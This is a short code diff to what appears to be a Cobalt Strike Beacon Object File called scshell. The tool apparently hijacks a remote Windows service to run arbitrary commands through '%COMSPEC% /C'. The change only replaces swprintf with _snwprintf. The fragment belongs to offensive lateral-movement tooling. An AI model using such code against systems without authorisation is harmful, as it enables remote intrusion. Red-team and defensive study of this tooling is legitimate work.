@@ -29,7 +29,7 @@ DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
 DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
 
-DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
+DECLSPEC_IMPORT int __cdecl MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
 DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
 DECLSPEC_IMPORT void  __cdecl MSVCRT$free(void*);
 
@@ -57,7 +57,7 @@ void go(char *args, int args_len) {
     /* Wrap command: %COMSPEC% /C "command" */
     wchar_t wCmd[2048] = {0};
     KERNEL32$MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 2048);
-    MSVCRT$swprintf(wCommand, 4096, L"%%COMSPEC%% /C \"%s\"", wCmd);
+    MSVCRT$_snwprintf(wCommand, 4096, L"%%COMSPEC%% /C \"%s\"", wCmd);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] scshell: hijacking '%s' on \\\\%s\n",
                  service, target);
